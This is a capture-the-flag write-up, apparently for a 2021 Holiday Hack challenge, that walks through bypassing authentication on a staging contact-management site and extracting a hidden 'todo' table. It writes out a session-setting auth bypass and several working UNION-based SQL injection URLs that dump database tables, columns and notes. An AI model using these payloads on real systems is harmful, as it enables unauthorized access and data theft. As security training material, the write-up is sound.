<table border=1px>
<tr>
    <td>
    <b>Difficulty Level : </b> <br>
    <img src="../../images/hhc2021/difficulty_5.png" alt="drawing" width="100px"/><br>
    </td>
</tr>
<tr>
    <td>
    <b>Challenge : </b> <br>
   Investigate Frost Tower's website for security issues. <br>
   This source code will be useful in your analysis. In Jack Frost's TODO list, what job position does Jack plan to offer Santa? <br>
   Ribb Bonbowford, in Santa's dining room, may have some pointers for you.
    </td>
</tr>

</table>

#### High level plan 
Below is the high level plan after examining the code. <br>
<ol>
    <li> Broken auth: Exploit the /postcontact endpoint to log in and get access to the dashboard. </li>
    <li> SQL Injection: Exploit the /detail endpoint to get additional table name (“todo”) and its column names. </li>
    <li> Get data from table “todo” table having the job position for Santa.</li>
</ol>

#### Get access to dashboard : exploit broken auth
The base URL of the website is <a href="https://staging.jackfrosttower.com/" target=_blank>https://staging.jackfrosttower.com/</a>
Looking at the source code (server.js), we figure out different endpoint’s pages. <br>
For example:</br>
a)	<a href="https://staging.jackfrosttower.com/dashboard" target=_blank>Dashboard</a> </br>
a)	<a href="https://staging.jackfrosttower.com/login" target=_blank>Login</a> </br>

Look at server.js (around line 670) <br>
The /dashboard endpoint needs a uniquid which is apparently created only after authentication.<br>
<img src="../../images/hhc2021/image136.png" alt="drawing" width="600px"/><br>

The /postcontact endpoint checks if the contact already exists, saves the email requested in the session.uniqueid.<br>
So, we will first create a contact with a specific email address and then use the same email address to attempt to create another contact. <br> That won’t succeed but the email will be stored in the session.uniqueid. 
[server.js, around line 151]
<img src="../../images/hhc2021/image137.png" alt="drawing" width="800px"/><br>

As we see below, entering another contact with email Stephan.Strange@gmail.com fails. <br> 
However, because the Session.UniquiID is set to the email address due to the bug, we have a session.<br>
Now, we can access the dashboard https://staging.jackfrosttower.com/dashboard.<br>

<table>
<tr>
    <th>
    Adding contact with email "Stephan.Strange@marvel.com". <br>
    Contact successfully added.
    </th>
    <th>
    Tried adding another contact with same email "Stephan.Strange@marvel.com".<br>
    Fails with "Email Already exists" error.
    </th>
</tr>
<tr>
    <td><img src="../../images/hhc2021/image138_1.png" alt="drawing" width="800px"/><br></td>
    <td><img src="../../images/hhc2021/image138_2.png" alt="drawing" width="800px"/><br></td>
<tr>
</table> <br>


#### Get additional table : exploit SQL Injection
Now that we have access to Dashboard, we navigate there.
In this dashboard, we see the "Detail" and the "Edit" functions. <br>
<img src="../../images/hhc2021/image138_3.png" alt="drawing" width="1200px"/>

Looking at the details of one contact. <br>
<a href="https://staging.jackfrosttower.com/detail/68" target=_blank>https://staging.jackfrosttower.com/detail/68</a> </br>
<img src="../../images/hhc2021/image140.png" alt="drawing" width="400px"/>

Now looking at the server.js for the corresponding code for /detail/:id <br>
We see It takes a CSV of contact Ids, split them with comma(,) and then form a WHERE clause.<br>
e.g. If we send <br>
https://staging.jackfrosttower.com/detail/67,68 <br>
It will result the below query to be executed: <br>
SELECT * FROM uniquecontact WHERE id=67 OR id=68 <br>
Resulting in showing 2 records on the web page.<br>

<table>
<tr>
    <th>
    The code
    </th>
    <th>
    Input and Output result
    </th>
</tr>
<tr>
    <td><img src="../../images/hhc2021/image141.png" alt="drawing" width="800px"/><br></td>
    <td><img src="../../images/hhc2021/image142_1.png" alt="drawing" width="800px"/><br></td>
<tr>
</table> <br>

But if we add a OR 1=1, it will show all contacts. <br>
<a href="https://stackoverflow.com/a/27289735/255562" target=_blank>Tautology based SQL Injection</a> <br>
<a href="https://staging.jackfrosttower.com/detail/67,68%20OR%201=1" target=_blank>https://staging.jackfrosttower.com/detail/67,68%20OR%201=1</a> <br>
<td><img src="../../images/hhc2021/image143.png" alt="drawing" width="800px"/><br></td>

Going back to the original question <br>
>In Jack Frost's TODO list, what job position does Jack plan to offer Santa?  <br>

The zip file containing source code also contains the database schema in the encontact_db.sql <br>
None of the tables in the encontact_db.sql suggest they could store todo items where we need to look for. <br> 
This means there are additional tables which the source code does not provide us.<br>

So, we query the system database views to find the additional tables. <br>

So we query the database to find the additional tables.

```
https://staging.jackfrosttower.com/detail/1,30 
UNION SELECT * FROM (SELECT 9999)a 
JOIN (SELECT 8888)b 
JOIN (SELECT TABLE_NAME from information_schema.TABLES as email )c 
JOIN (SELECT 7777)d 
JOIN (SELECT 6666)e 
JOIN (SELECT 5555)f 
JOIN (SELECT 4444)g --
```
In the above query, we are combining the uniquecontact with hard coded values along with the table names from INFORMATION_SCHEMA.TABLES. <br>
Its UNION which requires the number of columns and their names match between the tables getting union'ed.

<table>
    <tr>
        <th>Columns in the "uniquecontact" table</th>
        <th>Hardcoded</th>
    </tr>
    <tr>
        <td>id</td>
        <td>9999</td>
    </tr>
    <tr>
        <td>full_name</td>
        <td>8888</td>
    </tr>
    <tr>
        <td>email</td>
        <td>SELECT TABLE_NAME from information_schema.TABLES</td>
    </tr>
    <tr>
        <td>phone</td>
        <td>7777</td>
    </tr>
    <tr>
        <td>contry</td>
        <td>6666</td>
    </tr>
    <tr>
        <td>date_created</td>
        <td>5555</td>
    </tr>
    <tr>
        <td>date_update</td>
        <td>4444</td>
    </tr>
</table>

When we use the above URL with SQL injection payload, It shows the table name from information_schema.TABLES in the email field as we setup above. <br>

```sql
https://staging.jackfrosttower.com/detail/67,68 UNION SELECT * FROM (SELECT 9999)a 
JOIN (SELECT 8888)b 
JOIN (SELECT TABLE_NAME from information_schema.TABLES as email )c 
JOIN (SELECT 7777)d
JOIN (SELECT 6666)e 
JOIN (SELECT 5555)f 
JOIN (SELECT 4444)g --
```
<img src="../../images/hhc2021/image144.png" alt="drawing" width="400px"/>


Now we have additional "todo" table which may have our answer for "what job position does Jack plan to offer Santa". <br>
Now let's find the columns in the "todo" table using the same methodology but using the INFORMATION_SCHEMA.COLUMNS. <br>
The only difference here being, we concatenate all the column names as CSV using the <a href="https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php" target=_blank>group_concat()</a> function.<br>

```
https://staging.jackfrosttower.com/detail/37,68 UNION ALL SELECT * FROM (SELECT 9999)a 
JOIN (SELECT 8888)b 
JOIN (SELECT group_concat(COLUMN_NAME) from information_schema.COLUMNS as email)c 
JOIN (SELECT 7777)d 
JOIN (SELECT 6666)e 
JOIN (SELECT 5555)f 
JOIN (SELECT 4444)g --
```
Now we see the columns in all the three tables. <br>

<img src="../../images/hhc2021/image145.png" alt="drawing" width="1200px"/>

#### Extract data from additional table
We now focus on the newly found "todo" table. <br>
The most relevant column here is <b>note</b>. So, we get values from <b>note</b> column from "todo" table. <br>
```
https://staging.jackfrosttower.com/detail/1,30 UNION ALL SELECT * FROM (SELECT 9999)a 
JOIN (SELECT 8888)b 
JOIN (SELECT note from todo as email)c 
JOIN (SELECT 7777)d 
JOIN (SELECT 6666)e 
JOIN (SELECT 5555)f 
JOIN (SELECT 4444)g --
```

Now we see all the notes from “todo” table and one of them noting Jack Frost planned to offer <b>clerk</b> position to Santa. <br> 
We enter "clerk" as the answer and it is accepted!! <br>

<img src="../../images/hhc2021/image147.png" alt="drawing" width="400px"/>

